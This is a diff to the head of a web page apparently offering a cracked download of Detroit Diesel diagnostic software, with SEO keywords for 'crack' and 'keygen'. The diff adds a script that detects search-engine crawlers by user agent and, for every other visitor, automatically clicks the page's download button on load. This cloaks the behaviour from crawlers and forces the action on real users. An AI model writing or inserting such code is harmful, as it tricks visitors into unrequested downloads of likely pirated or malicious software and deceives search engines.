@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Detroit Diesel Diagnostic Link DDDL 8.19 2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Detroit Diesel Diagnostic Link DDDL 8.19 2024 for professional diagnostics of Detroit and Freightliner Cascadia vehicle systems.">
     <meta name="keywords" content="Detroit Diesel Diagnostic Link 8.19 download, DDDL 2024 free download, DDDL diagnostic software 2024, Detroit Diesel Diagnostic Link 8.19 crack, Detroit Diesel Diagnostic Link keygen, DDDL 8.19 2024 high speed download, Detroit Diesel Diagnostic Link troubleshooting, Detroit Diesel diagnostic software, Detroit Diesel diagnostic software 2024, Detroit Diesel diagnostics tool, Freightliner Cascadia diagnostic software, Western Star 5700XE diagnostic software, Detroit Diesel DDDL 8.19 software, DDDL 8.19 2024 download, DDDL 2024 diagnostic link, Detroit Diesel ECU diagnostics, EPA07 DD15 diagnostics, EPA10 DD13 diagnostics, GHG14 DD16 diagnostics, Noregon DLA adapter compatible software, Usb-Nexiq compatible diagnostic software, Detroit Diesel software free download, Detroit Diesel Diagnostic Link 8.19 free download, DiagnosticLink 8.0x features, Detroit Diesel offline diagnostic tool">
     <style>
